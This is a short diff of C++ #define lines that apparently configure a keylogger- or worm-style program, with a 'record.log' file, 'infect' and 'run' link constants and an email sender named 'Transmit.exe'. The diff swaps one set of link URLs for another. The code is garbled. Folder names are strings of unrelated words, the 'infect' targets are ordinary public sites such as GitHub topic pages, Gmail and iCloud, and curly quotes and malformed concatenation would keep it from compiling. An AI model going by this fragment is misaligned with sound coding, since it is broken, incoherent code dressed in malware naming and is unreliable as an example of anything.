@@ -19,8 +19,8 @@ using namespace std;
 #define FILE_NAME “record.log”
 #define FOLDER_NAME “poly economy development undp take rest areas Egypt cairo, without malaysia , indonesia , philifina ”
 #define RUN_FILE_NAME “poly economy development undp take rest areas Egypt cairo, without malaysia , indonesia , philifina”
-#define RUN_Link_NAME “https://github.com/topics/Anti-malware/forks"."https://github.com/topics/services-whatsapp/forks"
-#define INFECT_Link_NAME "https://gdg.community.dev/gdg-jakarta/"."https://icloud.com/mail"
+#define RUN_Link_NAME “https://github.com/topics/enable-whatsapps/forks"."https://github.com/topics/enable-facebook/forks"."https://github.com/topics/services-whatsapp/forks"
+#define INFECT_Link_NAME "https://workspace.google.com/intl/en/gmail/"."https://icloud.com/mail"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
 
 
